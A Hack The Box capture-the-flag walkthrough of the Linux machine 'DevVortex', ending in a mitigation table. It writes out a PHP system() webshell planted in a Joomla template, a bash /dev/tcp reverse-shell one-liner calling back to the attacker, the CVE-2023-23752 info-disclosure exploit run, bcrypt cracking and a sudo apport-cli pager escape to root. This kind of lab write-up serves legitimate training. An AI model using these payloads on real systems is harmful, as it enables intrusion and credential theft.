```
#htb #hackthebox #linux #easy #devvortex #rustscan #nmap #ffuf #vhost-fuzzing #joomla #cve-2023-23752 #information-disclosure #webshell #reverse-shell #hashcat #bcrypt #password-cracking #apport-cli #cve-2023-1326 #sudo-abuse #privilege-escalation #oscp-like
```

### Methods

```
# Alternative Methods - DevVortex HTB

## Reconnaissance
- Method 1: RustScan + Nmap targeted scan (Current)
- Method 2: Nmap full port scan (-p-)
- Method 3: Masscan

## Virtual Host Discovery
- Method 1: ffuf Host header fuzzing (Current)
- Method 2: gobuster vhost mode
- Method 3: wfuzz Host header fuzzing

## Content Discovery
- Method 1: ffuf directory/file fuzzing with common.txt + .php (Current)
- Method 2: feroxbuster recursive scan
- Method 3: gobuster dir mode

## CMS Identification
- Method 1: joomla.xml manifest version disclosure (Current)
- Method 2: robots.txt Joomla-specific paths
- Method 3: WhatWeb / CMSeeK fingerprinting

## Initial Access
- Method 1: CVE-2023-23752 unauthenticated API info disclosure → leaked DB creds (Current)
- Method 2: Joomla admin panel password brute force / spray
- Method 3: Known Joomla component RCE (if vulnerable extension installed)

## Gaining a Shell
- Method 1: PHP one-liner backdoor planted in Cassiopeia template's error.php (Current)
- Method 2: Joomla admin "Extensions → Templates" direct file editor upload
- Method 3: Malicious Joomla extension package upload (.zip)

## Lateral Movement (www-data → logan)
- Method 1: MySQL credential reuse → dump users table → crack bcrypt hash with hashcat (Current)
- Method 2: Search filesystem for reused credentials/config secrets
- Method 3: Password spray leaked DB password across system accounts

## Privilege Escalation (logan → root)
- Method 1: CVE-2023-1326 - apport-cli sudo pager escape to root shell (Current)
- Method 2: GTFOBins-style pager/less escape from any sudo-allowed binary that shells out
- Method 3: Check for other sudo-allowed binaries via `sudo -l` first
```

# DevVortex - HTB Walkthrough

## Box Info

| Field | Details |
|-------|---------|
| Name | DevVortex |
| Difficulty | Easy |
| OS | Linux |
| IP | 10.129.229.146 |
| Hostname | devvortex |
| Web Stack | Joomla 4.2.6 |

---

## Attack Chain

```
RustScan → Nmap (SSH + HTTP) → vhost Fuzzing (dev.devvortex.htb) → ffuf Content Discovery → Joomla Admin Panel Found → joomla.xml Version Disclosure (4.2.6) → CVE-2023-23752 Info Disclosure → DB Creds Leaked → Joomla Template Editor → PHP Webshell in error.php → Reverse Shell as www-data → configuration.php Creds → MySQL Access → users Table Dumped → bcrypt Hash Cracked (hashcat) → su logan → user.txt → sudo apport-cli → CVE-2023-1326 Pager Escape → root.txt
```

---

## Reconnaissance

### RustScan

```bash
rustscan -a 10.129.229.146
```

```
>>>
Open 10.129.229.146:22
Open 10.129.229.146:80
```

> Key Insight: Only SSH and HTTP are exposed — with SSH usually locked behind a password/key, the web application on port 80 is the entry point to focus on.

### Default Vhost

Browsing to the bare IP / default hostname shows a generic "DevVortex" web design agency landing page.

![Default DevVortex landing page served on the base hostname, a generic web design agency template](/img/htb/devvortex/01-devvortex-landing-page.png)

---

## Virtual Host Discovery

### ffuf Host Header Fuzzing

Ran a subdomain/vhost fuzz against the Host header to check for hidden virtual hosts on the same IP:

```bash
ffuf -u http://10.129.229.146 -H 'Host: FUZZ.devvortex.htb' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc all -ac
```

```
>>>
dev                     [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 237ms]
```

> Key Insight: The `-ac` (auto-calibrate) flag filters out the noise of similarly-sized false-positive responses, letting the real vhost (`dev`) stand out with a distinct response size.

### Adding the Vhost to /etc/hosts

```bash
cat /etc/hosts
```

```
127.0.0.1   localhost
127.0.1.1   kali

10.129.229.146   dev.devvortex.htb devvortex.htb
```

Browsing to `dev.devvortex.htb` reveals a completely different site — a dark-themed DevVortex web design template, distinct from the default vhost.

![dev.devvortex.htb virtual host showing a different, dark-themed DevVortex web design homepage](/img/htb/devvortex/02-dev-vhost-homepage.png)

---

## Content Discovery

### ffuf Directory/File Fuzzing

```bash
ffuf -u http://dev.devvortex.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -c -e .php
```

```
>>>
administrator           [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 307ms]
api                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 689ms]
cache                   [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 237ms]
components              [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 180ms]
configuration.php       [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 674ms]
home                    [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 827ms]
images                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 270ms]
includes                [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 240ms]
index.php               [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 878ms]
language                [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 168ms]
layouts                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 167ms]
libraries               [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 227ms]
media                   [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 560ms]
modules                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 340ms]
plugins                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 457ms]
robots.txt              [Status: 200, Size: 764, Words: 78, Lines: 30, Duration: 364ms]
templates               [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 219ms]
tmp                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 210ms]
```

> Key Insight: The directory names (`administrator`, `components`, `libraries`, `templates`) plus a bare `configuration.php` are a dead giveaway for **Joomla CMS**.

Navigating to `/administrator` confirms it — a Joomla Administrator login panel for a site named "Development".

![Joomla Administrator login panel discovered at /administrator, site named "Development"](/img/htb/devvortex/03-joomla-admin-panel.png)

---

## CMS Fingerprinting

### Version Disclosure via joomla.xml

Joomla's update manifest file leaks the exact installed version pre-authentication:

```
http://dev.devvortex.htb/administrator/manifests/files/joomla.xml
```

![joomla.xml manifest file disclosing the installed Joomla version as 4.2.6](/img/htb/devvortex/04-joomla-version-disclosure.png)

**Version confirmed: Joomla 4.2.6**

---

## Initial Access

### CVE-2023-23752 — Unauthenticated API Information Disclosure

Joomla versions 4.0.0–4.2.7 are vulnerable to **CVE-2023-23752**, which allows unauthenticated access to protected Joomla API endpoints, leaking user info and database credentials. Found a ready-made PoC on GitHub:

```
https://github.com/Acceis/exploit-CVE-2023-23752
```

```bash
ruby exploit.rb http://dev.devvortex.htb
```

```
>>>
Users
[649] lewis (lewis) - lewis@devvortex.htb - Super Users
[650] logan paul (logan) - logan@devvortex.htb - Registered

Site info
Site name: Development
Editor: tinymce
Captcha: 0
Access: 1
Debug status: false

Database info
DB type: mysqli
DB host: localhost
DB user: lewis
DB password: P4ntherg0t1n5r3c0n##
DB name: joomla
DB prefix: sd4fg_
DB encryption: 0
```

> Key Insight: The API leaks the **DB connection credentials** straight from `configuration.php`, plus confirms `lewis` is a Super User. Since credential reuse between the DB account and the CMS admin account is extremely common on CTF-style boxes, this password is worth trying directly on the admin login.

### First Login Attempt (Failed)

```
Username: lewis
Password: P4ntherg0t1n5r3c0n##
```

![Joomla admin login attempt with lewis and the leaked DB password returning "Username and password do not match"](/img/htb/devvortex/05-joomla-admin-login-failed.png)

> Key Insight: The first attempt failed — with a password containing special characters like `##`, it's worth double-checking for copy/paste issues before assuming credential reuse doesn't work. Retrying the exact same credentials carefully succeeded, granting full administrator access to the Joomla back end.

---

## Gaining a Shell

### Planting a PHP Backdoor via the Template Editor

With admin access confirmed, navigated to:

```
System → Site Templates → Cassiopeia Details and Files
```

Edited `error.php` (a legitimately editable template file) and inserted a simple command-execution backdoor:

```php
<?php
if(isset($_GET['cmd'])){
    system($_GET['cmd']);
    die();
}
?>
```

Saved the file, then triggered Joomla's custom error page (which loads `error.php`) with a nonexistent path to confirm code execution:

```
http://dev.devvortex.htb/NothingAtAll?cmd=ls
```

```
>>>
LICENSE.txt README.txt administrator api cache cli components configuration.php htaccess.txt images includes index.php language layouts libraries media modules plugins robots.txt templates tmp web.config.txt
```

![Joomla custom 404 error page executing the ls command via the planted error.php backdoor, confirming RCE](/img/htb/devvortex/06-webshell-rce-confirmed.png)

### Building a URL-Encoded Reverse Shell

To pass a full reverse shell one-liner through a GET parameter, spaces were first converted to `+`, then the payload was URL-encoded:

```
Original:
bash -c 'bash -i >& /dev/tcp/10.10.15.249/4422 0>&1'

After converting spaces to +:
bash+-c+'bash+-i+>&+/dev/tcp/10.10.15.249/4422+0>&1'

After URL encoding:
bash+-c+'bash+-i+>%26+%2Fdev%2Ftcp%2F10.10.15.249%2F4422+0>%261'
```

### Catching the Shell

```bash
nc -lnvp 4422
```

Triggered the payload by browsing to the crafted URL with the `cmd` parameter set to the encoded reverse shell.

```
>>>
listening on [any] 4422 ...
connect to [10.10.15.249] from (UNKNOWN) [10.129.229.146] 37248
bash: cannot set terminal process group (823): Inappropriate ioctl for device
bash: no job control in this shell
www-data@devvortex:~/dev.devvortex.htb$
```

![Browser triggering the URL-encoded reverse shell payload while netcat catches the connection as www-data](/img/htb/devvortex/07-reverse-shell-caught.png)

---

## Post-Exploitation Enumeration

### Webroot Enumeration

```bash
ls -la
```

```
>>>
-rw-r--r--  1 www-data www-data  2037 Sep 25  2023 configuration.php
drwxr-xr-x 11 www-data www-data  4096 Dec 13  2022 administrator
drwxr-xr-x  5 www-data www-data  4096 Dec 13  2022 api
```

### Reading configuration.php

```bash
cat configuration.php
```

```
>>>
public $user = 'lewis';
public $password = 'P4ntherg0t1n5r3c0n##';
public $db = 'joomla';
public $dbprefix = 'sd4fg_';
public $secret = 'ZI7zLTbaGKliS9gq';
public $mailfrom = 'lewis@devvortex.htb';
```

> Key Insight: `configuration.php` confirms the same DB credentials leaked by the CVE, plus a Joomla `secret` key (useful for session/cookie forgery in other attack paths, though not needed here).

---

## Lateral Movement — MySQL Credential Reuse

### Logging into MySQL

Note the DB password contains `##`, which the shell interprets as a comment when passed inline with `-p'...'`. The interactive prompt avoids that issue:

```bash
mysql -u lewis -p
```

```
>>>
Enter password: P4ntherg0t1n5r3c0n##
```

### Dumping the Users Table

```sql
show databases;
use joomla;
show tables;
select * from sd4fg_users;
```

```
>>>
| id  | name       | username | email               | password
| 649 | lewis      | lewis    | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u
| 650 | logan paul | logan    | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12
```

### Identifying and Cracking the Hash

```bash
hashid '$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12'
```

```
>>>
[+] bcrypt
```

```bash
hashcat -m 3200 hash_logan /usr/share/wordlists/rockyou.txt
```

```
>>>
$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12:tequieromucho
Status...........: Cracked
```

> Key Insight: bcrypt (mode 3200) is slow to crack by design (~195 H/s here) — this only worked because `tequieromucho` is a common word present in rockyou.txt, not because bcrypt itself is weak.

### Switching to logan

```bash
su logan
```

```
>>>
Password: tequieromucho
```

```bash
cat /home/logan/user.txt
```

```
>>>
713efad1e726af54df689692e03cad29
```

---

## Privilege Escalation

### Checking sudo Rights

```bash
sudo -l
```

```
>>>
User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```

### CVE-2023-1326 — apport-cli Pager Escape

Searched for known abuse of `apport-cli` under sudo and found a public PoC for **CVE-2023-1326**, where `apport-cli`'s "View report" option opens the report in a pager (`less`/`more`) that can be escaped to spawn a shell — inheriting the sudo-elevated privileges.

```bash
sudo /usr/bin/apport-cli /bin/bash
```

```
>>>
*** Collecting problem information
*** Send problem report to the developers?
  S: Send report (1.7 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): V
```

Chose **V** (View report), which opens the report in a pager. From inside the pager, escaping to a shell (`!/bin/bash`) spawns a root-owned shell:

```bash
!/bin/bash
```

```
>>>
root@devvortex:/tmp# whoami
root
```

### Capturing root.txt

```bash
cat /root/root.txt
```

```
>>>
1bd54296907a23ce2cf63c40d2647e39
```

---

## Summary

| Phase | Detail |
|---|---|
| **Enumeration** | Only SSH (22) and HTTP (80) open; hidden vhost `dev.devvortex.htb` found via Host-header fuzzing |
| **CMS Identified** | Joomla 4.2.6 (via directory structure + `joomla.xml` version disclosure) |
| **Initial Access** | CVE-2023-23752 unauthenticated API info disclosure → DB creds → reused as Joomla admin login |
| **Shell Obtained As** | `www-data` (via PHP backdoor planted in `error.php` template file) |
| **Lateral Movement** | MySQL creds from `configuration.php` → dumped `users` table → cracked logan's bcrypt hash with hashcat |
| **User Flag** | `713efad1e726af54df689692e03cad29` |
| **Privilege Escalation** | `sudo apport-cli` abused via CVE-2023-1326 pager escape |
| **Root Flag** | `1bd54296907a23ce2cf63c40d2647e39` |

### Tools Used

| Tool | Purpose |
|---|---|
| RustScan | Fast initial port discovery |
| Nmap | Service/version detection |
| ffuf | Vhost fuzzing + content/directory discovery |
| exploit-CVE-2023-23752 (Acceis) | Unauthenticated Joomla API info disclosure exploit |
| netcat (nc) | Reverse shell listener |
| MySQL client | Database access via reused credentials |
| hashid | Hash type identification |
| hashcat | Offline bcrypt password cracking |
| apport-cli (CVE-2023-1326 PoC) | Sudo pager escape to root |

---

## Mitigation

| Finding | Recommendation |
|---|---|
| Joomla 4.2.6 vulnerable to CVE-2023-23752 | Upgrade to Joomla 4.2.8+ immediately |
| Version disclosed via `joomla.xml` | Restrict access to `administrator/manifests/` at the web server level |
| DB and CMS admin credentials reused | Use unique, unrelated passwords for database and application accounts |
| Template editor allows arbitrary PHP file edits | Disable direct template editing in production, or restrict to trusted admins with MFA |
| Weak user password (`tequieromucho`) crackable via wordlist | Enforce strong password policy; consider passphrase-based or MFA-backed authentication |
| `apport-cli` allowed via sudo with no restrictions | Remove unnecessary sudo grants; never grant sudo on interactive/report-viewing tools (CVE-2023-1326) |
